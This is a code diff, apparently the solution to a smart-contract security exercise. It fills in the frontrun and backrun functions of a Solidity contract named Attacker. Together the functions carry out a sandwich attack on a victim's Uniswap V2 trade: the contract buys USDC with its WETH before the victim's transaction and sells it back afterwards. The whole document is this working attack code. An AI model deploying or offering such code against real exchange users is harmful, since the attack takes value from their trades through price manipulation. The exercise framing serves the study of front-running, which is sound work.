@@ -16,12 +16,24 @@ import "./interfaces/IERC20.sol";
 contract Attacker {
     // This function will be called before the victim's transaction.
     function frontrun(address router, address weth, address usdc, uint256 deadline) public {
-        // your code here
+        address[] memory path = new address[](2);
+        path[0] = weth;
+        path[1] = usdc;
+        // first place a buy trade
+        uint256 ethbalance = IERC20(weth).balanceOf(address(this));
+        IERC20(weth).approve(router, ethbalance);
+        IUniswapV2Router(router).swapExactTokensForTokens(ethbalance, 0, path, address(this), deadline);
     }
 
     // This function will be called after the victim's transaction.
     function backrun(address router, address weth, address usdc, uint256 deadline) public {
-        // your code here
+        address[] memory path = new address[](2);
+        path[0] = usdc;
+        path[1] = weth;
+        // then place a sell trade
+        uint256 usdcbalance = IERC20(usdc).balanceOf(address(this));
+        IERC20(usdc).approve(router, usdcbalance);
+        IUniswapV2Router(router).swapExactTokensForTokens(usdcbalance, 0, path, address(this), deadline);
     }
 }
 
